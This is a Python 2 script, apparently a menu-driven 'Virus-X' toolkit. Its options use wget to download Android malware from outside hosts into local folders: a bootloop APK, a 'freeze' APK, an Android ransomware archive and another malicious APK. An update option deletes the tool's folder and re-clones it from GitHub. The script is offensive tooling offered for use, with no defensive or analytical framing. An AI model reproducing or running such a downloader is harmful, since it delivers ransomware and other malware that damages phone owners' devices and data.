#!/usr/bin/evn python

import sys
import os
import time
import os as sistema

# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
os.system("cd banner;python2 banner4.py")
print
print ("\033[49m                   Welcome To Virus-X                     \033[0m")
print ("\033[48m                   Author: Trilok Singh                   \033[0m")
print

os.system("cd banner;python2 table.py")

def help():
  print
  print ("\033[44m Developer : Trilok Singh Maitry\033[0m")
  print ("\033[44m Program : VirusX\033[0m")
  print ("\033[44m Based On Python\033[0m")
  print
  main()

def main():
  dr = raw_input(">>> ")
  if dr == "show options":
    time.sleep(1)
    help()
    main()
    
    ############
    ###VIRUS1###
    ###########
  elif dr == "00":
		android = raw_input(""+R+"Virus"+B+"X > ")
		if android == "run":
			time.sleep(1)
			print (""+G+"Bootloop")
			time.sleep(2)
			print
			print ""+B+"[*] "+N+"Downloading..."
			time.sleep(1)
			os.system("cd virus;mkdir elite;cd elite;wget http://zumizec-com.waper.co/files/elite.apk")
			print
			print "Now check folder Virus on "+R+"/VirusX/virus/elite/"+N+""
			print ""+B+"[*]"+N+"Done..."
			print
			main()
  elif dr == "01":
		rez = raw_input(""+R+"Virus"+B+"X > ")
		if rez == "run":
			time.sleep(1)
			print (""+G+"Freeze")
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir freeze;cd freeze;wget http://zumizec-com.waper.co/files/freeze.apk")
			print
			print "Now check folder virus on"+R+" /VirusX/virus/freeze/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Done..."
			print
			main()
  elif dr == "02":
		dea = raw_input(""+R+"Virus"+B+"X > ")
		if dea == "run":
			time.sleep(1)
			print (""+G+"Ran")
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir androidran;cd androidran;wget http://loolzec.blogwaper.com/files/androidransomware.zip")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/androidran/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Done..."
			print
			main()
  elif dr == "03":
		dea = raw_input(""+N+"VirusX > ")
		if dea == "run":
			time.sleep(1)
			print ""+B+"[*]"+N+" Downloading virus..."
			os.system("cd virus;mkdir malware;cd malware;wget http://loolzec.blogwaper.com/files/b.apk")
			time.sleep(1)
			print
			print "Now check folder virus on "+R+"/VirusX/virus/malware/"
			time.sleep(1)
			print ""+B+"[*]"+N+"Done..."
			print
			main()
    
  elif dr == "virusx update":
    print ""+G+"~ "+B+"UPDATING..."
    time.sleep(2)
    print ""+G+"Cloning repo..."
    time.sleep(6)
    os.system("cd ..;rm -rf VirusX;git clone https://github.com/TSMaitry/VirusX;cd VirusX;python2 VirusX.py")
    main()
  elif dr == "10":
  	time.sleep(1)
  	print ""+R+"exiting..."
  	time.sleep(1)
  	print "bye_bye"
  	sys.exit()
  	main()
if __name__ == "__main__":
	main()
  
